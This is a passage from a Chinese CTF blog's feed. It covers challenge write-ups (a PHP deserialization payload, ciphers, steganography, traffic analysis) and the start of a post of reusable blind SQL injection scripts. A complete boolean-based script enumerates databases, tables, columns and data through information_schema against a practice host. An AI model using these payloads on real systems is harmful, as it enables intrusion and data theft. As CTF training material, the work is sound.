&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token argument-name&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Diana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;username&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hah&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;password&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hah&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;再参考俩序列化的结果，找到要替换的部分&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;s:8:&#34;&lt;/span&gt;password&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;s:3:&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;因为构造的 b 肯定不是个位数，而是十位数，所以上面的 3 肯定是十位数 xx&lt;/p&gt;
&lt;p&gt;总共 23 位，所以补一位 23 + 1 = 3 * 8&lt;/p&gt;
&lt;p&gt;所以 a 一共要 8 个 Eileen 替换为 Ava&lt;/p&gt;
&lt;p&gt;得到最终 payload：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;EileenEileenEileenEileenEileenEileenEileenEileen&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;b&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;s:8:&#34;&lt;/span&gt;password&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;O:5:&#34;&lt;/span&gt;Bella&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;:1:&amp;#123;s:1:&#34;&lt;/span&gt;b&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;O:5:&#34;&lt;/span&gt;Carol&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;:1:&amp;#123;s:1:&#34;&lt;/span&gt;c&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;s:8:&#34;&lt;/span&gt;flag&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;php&#34;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;ps：试了一下有反应但没 flag，最后各种尝试修改 payload，删了一个括号看到了 flag。。（F12）&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;crypto-tik-tak&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#crypto-tik-tak&#34;&gt;#&lt;/a&gt; Crypto--tik-tak&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/26/g1wjJHZVp7bKFvx.png&#34; alt&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;进去之前看到提示，键盘，又对比了一下密码，得到如下信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;密码跟键盘有关&lt;/li&gt;
&lt;li&gt;数字都是重叠的&lt;/li&gt;
&lt;li&gt;每个重叠的为一组，不然不会需要 | 来分割&lt;/li&gt;
&lt;li&gt;应该为 12 个字母 3-3-2-4 ，可能为单词拼起来的 flag&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;百度一下键盘密码，找到了相关的东西：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/26/AdUmwxV1uQphJEz.png&#34; alt&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;照着百度方法试着拼了一下，啥都不是&lt;/p&gt;
&lt;p&gt;仔细研究了一下，最后发现这些字母上面的字母能拼成简单的单词，那就基本没跑了！&lt;/p&gt;
&lt;p&gt;成功得到 flag: you-are-so-good&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;misc-缩小查看更多&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc-缩小查看更多&#34;&gt;#&lt;/a&gt; MISC-- 缩小查看更多&lt;/h1&gt;
&lt;p&gt;ps：签到略了&lt;/p&gt;
&lt;p&gt;下载了是一张图片，不太会，直接百度了下，图片隐写如何查看更多信息&lt;/p&gt;
&lt;p&gt;然后了解到了 StegSolve，是比较常见的藏信息的方式，抱着试了一下的心态：&lt;/p&gt;
&lt;p&gt;看到了个好玩的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/26/aGmgJ6OuHwky8Fj.png&#34; alt&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;然后成功找 flag&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvbUNaYVl5Z1JqS0VzVXZTLnBuZw==&#34;&gt;https://i.loli.net/2021/08/26/mCZaYygRjKEsUvS.png&lt;/span&gt;&amp;quot; alt=&amp;quot;4.png&amp;quot; style=&amp;quot;zoom:67%;&amp;quot; /&amp;gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;misc-仅仅是流量分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc-仅仅是流量分析&#34;&gt;#&lt;/a&gt; MISC-- 仅仅是流量分析？&lt;/h1&gt;
&lt;p&gt;这道题是真不会，于是网上搜了一下后缀，然后找到了教程。。&lt;/p&gt;
&lt;p&gt;BUUCTF-MISC-USB 差不多原题，看着做了下&lt;/p&gt;
&lt;p&gt;先是修压缩包，也没说啥软件，我就拿上次做 upload 题用的 010 editor 试了下，可以修改&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/26/z3NnYUBfTuey56Q.png&#34; alt&gt;&amp;lt;!--p5--&amp;gt;&lt;/p&gt;
&lt;p&gt;找到图片，Stegslove，找到二维码：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/26/iAdMRve6fyLGYZW.png&#34; alt&gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/26/uIWnpc9m4ZLOrYd.png&#34; alt&gt;&amp;lt;!--p7--&amp;gt;&lt;/p&gt;
&lt;p&gt;扫码得到： &lt;code&gt;ci&amp;#123;v3erf_0tygidv2_fc0&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;用 010 打开另一个 ftm 文件，搜索关键词 key，找到了 key.pcap&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/26/SKzxRFdAGk8Hevr.png&#34; alt&gt;&amp;lt;!--p8--&amp;gt;&lt;/p&gt;
&lt;p&gt;然后跟着 wp 做:&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/26/Qo8FyOxmAHV9Ejh.png&#34; alt=&#34;9.png&#34;&gt;&amp;lt;!--p9--&amp;gt;&lt;/p&gt;
&lt;p&gt;得到内容： &lt;code&gt;xinan&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;维吉尼亚密码在线解密：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/26/XhV1yTBWSUp8uqx.png&#34; alt&gt;&amp;lt;!--p10--&amp;gt;&lt;/p&gt;
&lt;p&gt;栅栏密码：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/26/7J8S2q3Emeta5AW.png&#34; alt&gt;&amp;lt;!--p11--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;misc-可爱猫猫&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc-可爱猫猫&#34;&gt;#&lt;/a&gt; MISC-- 可爱猫猫&lt;/h1&gt;
&lt;p&gt;看到两张一样图片，再一看大小 5mb，就想到双图隐写，考虑是盲水印&lt;/p&gt;
&lt;p&gt;然后用 github 上的工具 BlindWaterMark 进行盲水印图片的合成和提取&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python bwm&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;py decode cat1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;png cat2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;png cat3&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;png &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;oldseed&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;然后得到 cat3.png，打开，模糊能看到 flag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/26/szMPdviJWgOjb5r.png&#34; alt&gt;&amp;lt;!--p12--&amp;gt;&lt;/p&gt;
&lt;p&gt;仔细读能读到，也可用 StegSolve 反转读&lt;/p&gt;
&lt;p blindwatermark1234&gt;flag&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="随笔" />
        <updated>2021-08-28T10:37:25.122Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/08/17/ctf/web/sql/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</id>
        <title>ctfweb-各种盲注脚本</title>
        <link rel="alternate" href="http://imfanqie.top/2021/08/17/ctf/web/sql/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"/>
        <content type="html">&lt;p&gt;以下的几个脚本都是自己写的（有参考别的大佬），代码可能不是最精简，但是还算顺眼&lt;/p&gt;
&lt;p&gt;核心算法都是&lt;strong&gt;二分法&lt;/strong&gt;，不推荐时间盲注（速度硬伤）&lt;/p&gt;
&lt;p&gt;脚本 payload 参考题目：[第一章 web 入门] SQL 注入 - 2  / 极客大挑战 finilysql（buuctf）&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;1通过post传参的脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1通过post传参的脚本&#34;&gt;#&lt;/a&gt; 1. 通过 post 传参的脚本&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;用的时候修改 post 参数和个数&lt;/p&gt;
&lt;h2 id=&#34;11-基于异或盲注布尔盲注等&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11-基于异或盲注布尔盲注等&#34;&gt;#&lt;/a&gt; 1.1 基于&lt;strong&gt;异或盲注&lt;/strong&gt;，&lt;strong&gt;布尔盲注&lt;/strong&gt;等：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    high &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;127&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    low &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; high &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; low&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload = f&#34;1&#39; or ascii (substr (database (),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;#&#34;    #查库&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload = f&#34;1&#39; or ascii (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema)=&#39;note&#39;),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;#&#34;   #查表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#payload = f&#34;1&#39; or ascii (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name)=&#39;fl4g&#39;),&amp;#123;i&amp;#125;,1))&gt;&amp;#123;mid&amp;#125;#&#34;   #查列&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;1&#39; or ascii(substr((seleCt(flag)from(fl4g)),&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;,1))&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;#&#34;&lt;/span&gt;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;#查数据&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#34;pass&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;qwer&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;u6216&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            low &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            high &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;       &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; low &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        flag &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;12-基于时间盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12-基于时间盲注&#34;&gt;#&lt;/a&gt; 1.2 基于&lt;strong&gt;时间盲注&lt;/strong&gt;：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token 